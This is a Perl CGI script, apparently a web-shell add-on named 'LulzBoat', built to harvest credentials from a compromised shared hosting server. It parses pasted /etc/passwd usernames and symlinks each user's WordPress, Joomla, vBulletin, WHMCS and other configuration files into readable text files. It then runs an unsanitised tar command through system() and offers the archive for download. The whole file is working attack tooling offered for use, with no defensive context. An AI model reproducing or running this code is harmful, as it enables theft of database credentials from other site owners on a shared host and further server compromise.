#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>LulzBoat</title>
<link rel="shortcut icon" href="#"/>
<style type="text/css">
body {
	background-color: #000000;
	background-image: url(#);
}
.newStyle1 {
 font-family: Tahoma;
 font-size: x-small;
 font-weight: bold;
 color: #59E817;
  text-align: center;
}
</style>
</head>
';
sub lil{
    ($user) = @_;
$msr = qx{pwd};
$kola=$msr."/".$user;
$kola=~s/\n//g;
 symlink('/home/'.$user.'/public_html/vb/includes/config.php',$kola.'-vb.txt');
 symlink('/home/'.$user.'/public_html/includes/config.php',$kola.'-includes-vb.txt');
 symlink('/home/'.$user.'/public_html/config.php',$kola.'2.txt');
 symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'3.txt');
 symlink('/home/'.$user.'/public_html/admin/conf.php',$kola.'5.txt');
 symlink('/home/'.$user.'/public_html/admin/config.php',$kola.'4.txt');
 symlink('/home/'.$user.'/public_html/wp-config.php',$kola.'-wp23.txt');
 symlink('/home/'.$user.'/public_html/blog/wp-config.php',$kola.'-wpblog.txt');
 symlink('/home/'.$user.'/public_html/conf_global.php',$kola.'6.txt');
 symlink('/home/'.$user.'/public_html/include/db.php',$kola.'7.txt');
 symlink('/home/'.$user.'/public_html/connect.php',$kola.'8.txt');
 symlink('/home/'.$user.'/public_html/mk_conf.php',$kola.'9.txt');
 symlink('/home/'.$user.'/public_html/configuration.php',$kola.'-joom.txt');
 symlink('/home/'.$user.'/public_html/include/config.php',$kola.'12.txt');
 symlink('/home/'.$user.'/public_html/joomla/configuration.php',$kola.'-joomla.txt');
 symlink('/home/'.$user.'/public_html/whm/configuration.php',$kola.'-whm15.txt');
 symlink('/home/'.$user.'/public_html/whmc/configuration.php',$kola.'-whmc16.txt');
 symlink('/home/'.$user.'/public_html/support/configuration.php',$kola.'-support.txt');


}
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if ($FORM{pass} eq ""){
print '
<body class="newStyle1" bgcolor="#000000">
<p>Lulz/../../../</p>
<p><font color="#C0C0C0">[</font>recoded by<font color="#FF0000"> nginx1337</font><font color="#C0C0C0">]</font>
<form method="post">
<textarea name="pass" style="border:1px dotted #FF0000; width: 543px; height: 420px; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#FF0000"  ></textarea></p>
<p align="center">
<input name="tar" type="text" style="border:1px dotted #FF0000; width: 212px; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#FF0000; "  /></p>
<p align="center">
<input name="Submit1" type="submit" value="GET CONFIG !" style="border:1px dotted #FF0000; width: 99; font-family:Tahoma; font-size:10pt; color:#59E817; text-transform:uppercase; height:23; background-color:#0C0C0C" /></p>
</form>';
}else{
@lines =<$FORM{pass}>;
$y = @lines;
open (MYFILE, ">tar.tmp");
print MYFILE "tar -czf ".$FORM{tar}.".tar ";
for ($ka=0;$ka<$y;$ka++){
while(@lines[$ka]  =~ m/(.*?):x:/g){
&lil($1);
print MYFILE $1.".txt ";
for($kd=1;$kd<18;$kd++){
print MYFILE $1.$kd.".txt ";
}
}
 }
print'<body class="newStyle1" bgcolor="#000000">
<p>You got it!!<br><br><br><font color="#C0C0C0">[</font>recoded by <font color="#FF0000">Nginx1337</font><font color="#C0C0C0">]</font></p>
<p>&nbsp;</p>';
if($FORM{tar} ne ""){
open(INFO, "tar.tmp");
@lines =<INFO> ;
close(INFO);
system(@lines);
print'<p><a href="'.$FORM{tar}.'.tar"><font color="#00FF00">
<span style="text-decoration: none">Hit Me To Download Tar File</span></font></a></p>';
}
}
 print"
</body>
</html>";
